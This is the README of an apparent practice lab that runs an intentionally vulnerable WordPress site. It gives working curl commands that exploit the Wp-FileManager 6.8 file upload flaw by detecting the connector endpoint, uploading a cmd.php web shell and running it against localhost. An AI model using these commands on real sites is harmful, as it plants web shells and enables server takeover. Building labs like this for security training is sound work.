# WordpressVuln



A vulnerable wordpress site


# Install 

The vulnerable wordpress server run in :
- a virtual machine on an ubuntu host 
- in a docker



## VM

### Install thanks vagrant  
```
sudo apt install vagrant
git clone https://github.com/jossets/WordpressVuln
vagrant up
```

### Credentials 

Vagrant alpine box credentials are:
- login: vagrant 
- password: vagrant 

## Docker 

### Install thanks docker-compose  
```
sudo apt install docker-compose
git clone https://github.com/jossets/WordpressVuln
docker-compose up
```

# Exploit 

WordPress Plugin Wp-FileManager 6.8 - RCE 
https://www.exploit-db.com/exploits/49178

## Detect 
```
curl  "http://localhost:8080/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"

{"error":["errUnknownCmd"]}
```

## Exploit

### Upload cmd.php
```
curl -F "cmd=upload" -F "target=l1_Lw"  -F "upload[]=@cmd.php" "http://localhost:8080/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
```

### Run it
```
curl  "http://localhost:8080/wp-content/plugins/wp-file-manager/lib/files/cmd.php"

Pwnd
```